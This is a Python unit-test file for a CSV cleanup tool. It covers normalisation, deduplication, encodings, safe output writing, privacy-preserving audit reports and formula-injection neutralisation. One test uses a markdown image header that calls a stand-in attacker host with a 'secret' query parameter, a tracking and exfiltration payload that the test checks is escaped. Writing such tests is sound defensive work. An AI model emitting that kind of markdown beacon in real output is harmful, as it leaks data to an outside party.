from __future__ import annotations

import csv
import io
import json
import tempfile
import unittest
from pathlib import Path

from spreadsheet_rescue.cli import main
from spreadsheet_rescue.engine import RescueError, rescue_csv


class SpreadsheetRescueTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary_directory = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary_directory.name)

    def tearDown(self) -> None:
        self.temporary_directory.cleanup()

    def write_csv(self, name: str, rows: list[list[str]]) -> Path:
        path = self.root / name
        with path.open("w", encoding="utf-8-sig", newline="") as handle:
            csv.writer(handle).writerows(rows)
        return path

    def write_config(self, value: dict) -> Path:
        path = self.root / "config.json"
        path.write_text(json.dumps(value), encoding="utf-8")
        return path

    def read_csv(self, path: Path) -> list[list[str]]:
        with path.open("r", encoding="utf-8-sig", newline="") as handle:
            return list(csv.reader(handle))

    def test_full_cleanup_and_audit(self) -> None:
        source = self.write_csv(
            "dirty.csv",
            [
                [" Name ", "Order Date", " Amount ", "Phone"],
                [" Ada ", "03/14/2026", "$1,200", "(312) 555-0100"],
                ["Ada", "2026-03-14", "1200.00", "+13125550100"],
                [" Grace ", "03-15-2026", "(89.5)", "312.555.0199 x42"],
                [" Grace ", "03-15-2026", "(89.5)", "312.555.0199 x42"],
                ["", "", "", ""],
            ],
        )
        config = self.write_config(
            {
                "dates": [
                    {
                        "column": "Order Date",
                        "input_formats": ["%Y-%m-%d", "%m/%d/%Y", "%m-%d-%Y"],
                        "output_format": "%Y-%m-%d",
                    }
                ],
                "currencies": [
                    {
                        "column": "Amount",
                        "symbols": ["$"],
                        "decimal_separator": ".",
                        "thousands_separator": ",",
                        "decimal_places": 2,
                        "allow_parentheses": True,
                    }
                ],
                "phones": [
                    {
                        "column": "Phone",
                        "default_country_code": "1",
                        "national_lengths": [10],
                        "output_format": "international",
                        "allow_extensions": True,
                    }
                ],
            }
        )
        result = rescue_csv(source, config_path=config, output_dir=self.root / "out")
        self.assertEqual(
            self.read_csv(result.cleaned_path),
            [
                ["name", "order_date", "amount", "phone"],
                ["Ada", "2026-03-14", "1200.00", "+13125550100"],
                ["Grace", "2026-03-15", "-89.50", "+13125550199 x42"],
            ],
        )
        self.assertEqual(result.audit["rows"]["input"], 5)
        self.assertEqual(result.audit["rows"]["output"], 2)
        self.assertEqual(result.audit["rows"]["exact_duplicates_removed"], 2)
        self.assertEqual(result.audit["rows"]["blank_removed"], 1)
        self.assertFalse(result.audit["privacy"]["raw_cell_values_logged"])
        on_disk_audit = json.loads(result.json_report_path.read_text(encoding="utf-8"))
        self.assertEqual(on_disk_audit["output"]["sha256"], result.audit["output"]["sha256"])
        self.assertNotIn("(312) 555-0100", result.json_report_path.read_text(encoding="utf-8"))
        self.assertNotIn("Ada", result.json_report_path.read_text(encoding="utf-8"))
        self.assertNotIn("Ada", result.markdown_report_path.read_text(encoding="utf-8"))

    def test_ambiguous_and_invalid_values_are_unchanged_without_value_logging(self) -> None:
        source = self.write_csv(
            "private.csv",
            [["When", "Amount", "Phone"], ["03/04/2026", "1,2,3", "private-number"]],
        )
        config = self.write_config(
            {
                "dates": [
                    {
                        "column": "When",
                        "input_formats": ["%m/%d/%Y", "%d/%m/%Y"],
                        "output_format": "%Y-%m-%d",
                    }
                ],
                "currencies": [{"column": "Amount"}],
                "phones": [{"column": "Phone"}],
            }
        )
        result = rescue_csv(source, config_path=config, output_dir=self.root / "out")
        self.assertEqual(
            self.read_csv(result.cleaned_path)[1],
            ["03/04/2026", "1,2,3", "private-number"],
        )
        stats = {item["kind"]: item for item in result.audit["field_normalization"]}
        self.assertEqual(stats["date"]["ambiguous"], 1)
        self.assertEqual(stats["currency"]["invalid"], 1)
        self.assertEqual(stats["phone"]["invalid"], 1)
        report_text = result.json_report_path.read_text(encoding="utf-8")
        self.assertNotIn("03/04/2026", report_text)
        self.assertNotIn("private-number", report_text)

    def test_currency_sign_placement_and_malformed_phone_punctuation(self) -> None:
        source = self.write_csv(
            "formats.csv",
            [
                ["Amount", "Phone"],
                ["-$1,234.5", "(312) 555-0100"],
                ["$-9", "(312 555-0100"],
                ["(-$4)", "312.555.0199"],
            ],
        )
        config = self.write_config(
            {
                "currencies": [{"column": "Amount"}],
                "phones": [{"column": "Phone"}],
            }
        )
        result = rescue_csv(source, config_path=config, output_dir=self.root / "out")
        self.assertEqual(
            self.read_csv(result.cleaned_path)[1:],
            [
                ["-1234.50", "+13125550100"],
                ["-9.00", "(312 555-0100"],
                ["(-$4)", "+13125550199"],
            ],
        )
        stats = {item["kind"]: item for item in result.audit["field_normalization"]}
        self.assertEqual(stats["currency"]["invalid"], 1)
        self.assertEqual(stats["phone"]["invalid"], 1)

    def test_dry_run_has_no_filesystem_writes(self) -> None:
        source = self.write_csv("dry.csv", [[" A "], [" x "]])
        destination = self.root / "does-not-exist"
        result = rescue_csv(source, output_dir=destination, dry_run=True)
        self.assertTrue(result.dry_run)
        self.assertFalse(destination.exists())
        self.assertIsNone(result.cleaned_path)
        self.assertEqual(result.cleaned_headers, ["a"])

    def test_explicit_non_comma_delimiter_is_used_and_preserved(self) -> None:
        source = self.root / "semicolon.csv"
        with source.open("w", encoding="utf-8-sig", newline="") as handle:
            csv.writer(handle, delimiter=";").writerows(
                [["Name", "Note"], ["Ada", "contains, a comma"]]
            )
        config = self.write_config({"csv": {"delimiter": ";"}})

        result = rescue_csv(source, config_path=config, output_dir=self.root / "out")

        with result.cleaned_path.open("r", encoding="utf-8-sig", newline="") as handle:
            output = list(csv.reader(handle, delimiter=";"))
        self.assertEqual(output, [["name", "note"], ["Ada", "contains, a comma"]])
        self.assertEqual(result.audit["input"]["delimiter"], ";")
        self.assertEqual(result.audit["output"]["delimiter"], ";")

    def test_cp1252_input_and_output_encoding_are_supported(self) -> None:
        source = self.root / "legacy.csv"
        source.write_bytes("Name,City\nRené,Montréal\n".encode("cp1252"))
        config = self.write_config(
            {"csv": {"encoding": "cp1252", "output_encoding": "cp1252"}}
        )

        result = rescue_csv(source, config_path=config, output_dir=self.root / "out")

        with result.cleaned_path.open("r", encoding="cp1252", newline="") as handle:
            output = list(csv.reader(handle))
        self.assertEqual(output, [["name", "city"], ["René", "Montréal"]])
        self.assertEqual(result.audit["input"]["encoding"], "cp1252")
        self.assertEqual(result.audit["output"]["encoding"], "cp1252")
        self.assertIn(b"Ren\xe9", result.cleaned_path.read_bytes())

    def test_never_overwrites_input_or_existing_output(self) -> None:
        source = self.write_csv("job_cleaned.csv", [["A"], ["1"]])
        with self.assertRaisesRegex(RescueError, "overwrite the input"):
            rescue_csv(source, output_dir=self.root, output_prefix="job")

        other = self.write_csv("source.csv", [["A"], ["1"]])
        output_dir = self.root / "out"
        output_dir.mkdir()
        protected = output_dir / "source_cleaned.csv"
        protected.write_text("do not replace", encoding="utf-8")
        with self.assertRaisesRegex(RescueError, "existing output"):
            rescue_csv(other, output_dir=output_dir)
        self.assertEqual(protected.read_text(encoding="utf-8"), "do not replace")

    def test_duplicate_and_empty_headers_and_wide_rows_are_preserved(self) -> None:
        source = self.write_csv(
            "wide.csv",
            [[" Name ", "Name", ""], ["A", "B", "C", "surplus"], ["D"]],
        )
        result = rescue_csv(source, output_dir=self.root / "out")
        output = self.read_csv(result.cleaned_path)
        self.assertEqual(output[0], ["name", "name_2", "column_3", "extra_column_4"])
        self.assertEqual(output[1], ["A", "B", "C", "surplus"])
        self.assertEqual(output[2], ["D", "", "", ""])
        self.assertEqual(result.audit["columns"]["generated_for_wide_rows"], 1)
        self.assertEqual(result.audit["rows"]["padded"], 1)

    def test_missing_configured_column_fails_fast(self) -> None:
        source = self.write_csv("missing.csv", [["Name"], ["A"]])
        config = self.write_config(
            {
                "dates": [
                    {
                        "column": "Not There",
                        "input_formats": ["%Y-%m-%d"],
                        "output_format": "%Y-%m-%d",
                    }
                ]
            }
        )
        with self.assertRaisesRegex(RescueError, "was not found"):
            rescue_csv(source, config_path=config, dry_run=True)

    def test_cli_reports_error_without_traceback(self) -> None:
        stderr = io.StringIO()
        old_stderr = __import__("sys").stderr
        try:
            __import__("sys").stderr = stderr
            code = main([str(self.root / "absent.csv"), "--dry-run"])
        finally:
            __import__("sys").stderr = old_stderr
        self.assertEqual(code, 2)
        self.assertIn("does not exist", stderr.getvalue())

    def test_output_encoding_error_is_safe_and_removes_partial_file(self) -> None:
        source = self.write_csv("unicode.csv", [["Name"], ["René"]])
        config = self.write_config({"csv": {"output_encoding": "ascii"}})
        output_dir = self.root / "out"
        with self.assertRaisesRegex(RescueError, "write rescue outputs safely"):
            rescue_csv(source, config_path=config, output_dir=output_dir)
        self.assertFalse((output_dir / "unicode_cleaned.csv").exists())
        self.assertFalse((output_dir / "unicode_changes.json").exists())

    def test_unterminated_quote_is_rejected(self) -> None:
        source = self.root / "malformed.csv"
        source.write_text('A,B\n"unterminated,2\n', encoding="utf-8")
        with self.assertRaisesRegex(RescueError, "Could not read CSV"):
            rescue_csv(source, dry_run=True)

    def test_invalid_enum_types_become_safe_configuration_errors(self) -> None:
        source = self.write_csv("config.csv", [["A"], ["1"]])
        for invalid_config in (
            {"headers": {"case": []}},
            {"headers": {"unicode_normalization": []}},
            {"behavior": {"missing_columns": []}},
            {"security": {"formula_policy": []}},
            {"phones": [{"column": "A", "output_format": []}]},
        ):
            config = self.write_config(invalid_config)
            with self.subTest(config=invalid_config):
                with self.assertRaises(RescueError):
                    rescue_csv(source, config_path=config, dry_run=True)

    def test_formula_risk_is_counted_without_logging_value_and_can_be_neutralized(self) -> None:
        source = self.write_csv("formula.csv", [["Name", "Note"], ["A", "=2+2"]])
        warn_result = rescue_csv(source, output_dir=self.root / "warn")
        self.assertEqual(warn_result.audit["changes"]["formula_like_cells"], 1)
        self.assertEqual(warn_result.audit["changes"]["formula_cells_neutralized"], 0)
        self.assertNotIn("=2+2", warn_result.json_report_path.read_text(encoding="utf-8"))

        config = self.write_config({"security": {"formula_policy": "neutralize"}})
        neutralized = rescue_csv(source, config_path=config, output_dir=self.root / "safe")
        self.assertEqual(self.read_csv(neutralized.cleaned_path)[1][1], "'=2+2")
        self.assertEqual(neutralized.audit["changes"]["formula_cells_neutralized"], 1)

    def test_formula_risk_counts_and_warnings_match_deduplicated_output(self) -> None:
        source = self.write_csv(
            "duplicate_formulas.csv",
            [
                ["Name", "Note"],
                ["A", "=2+2"],
                ["A", "=2+2"],
                ["B", "+SUM(A1:A2)"],
                ["B", "+SUM(A1:A2)"],
                ["C", "plain"],
                ["", ""],
            ],
        )

        warn_result = rescue_csv(source, output_dir=self.root / "warn")
        self.assertEqual(
            self.read_csv(warn_result.cleaned_path),
            [
                ["name", "note"],
                ["A", "=2+2"],
                ["B", "+SUM(A1:A2)"],
                ["C", "plain"],
            ],
        )
        self.assertEqual(warn_result.audit["rows"]["exact_duplicates_removed"], 2)
        self.assertEqual(warn_result.audit["rows"]["blank_removed"], 1)
        self.assertEqual(warn_result.audit["changes"]["formula_like_cells"], 2)
        self.assertEqual(warn_result.audit["changes"]["formula_cells_neutralized"], 0)
        self.assertEqual(
            warn_result.audit["warnings"],
            [
                "Detected 2 formula-like cell(s); values were preserved, so review "
                "them before opening the CSV in Excel or another spreadsheet application"
            ],
        )

        config = self.write_config({"security": {"formula_policy": "neutralize"}})
        neutralized = rescue_csv(source, config_path=config, output_dir=self.root / "safe")
        self.assertEqual(
            self.read_csv(neutralized.cleaned_path),
            [
                ["name", "note"],
                ["A", "'=2+2"],
                ["B", "'+SUM(A1:A2)"],
                ["C", "plain"],
            ],
        )
        self.assertEqual(neutralized.audit["rows"]["exact_duplicates_removed"], 2)
        self.assertEqual(neutralized.audit["changes"]["formula_like_cells"], 2)
        self.assertEqual(neutralized.audit["changes"]["formula_cells_neutralized"], 2)
        self.assertEqual(
            neutralized.audit["warnings"],
            [
                "Neutralized 2 formula-like cell(s) with a leading apostrophe "
                "to reduce spreadsheet formula-injection risk"
            ],
        )

    def test_markdown_report_neutralizes_active_header_syntax(self) -> None:
        malicious_header = "![tracking](https://attacker.invalid/pixel?job=secret)"
        source = self.write_csv("markdown.csv", [[malicious_header], ["safe value"]])
        result = rescue_csv(source, output_dir=self.root / "out")
        report = result.markdown_report_path.read_text(encoding="utf-8")
        self.assertNotIn(malicious_header, report)
        self.assertNotIn("![tracking]", report)
        self.assertIn("&#33;&#91;tracking&#93;&#40;https", report)


if __name__ == "__main__":
    unittest.main()
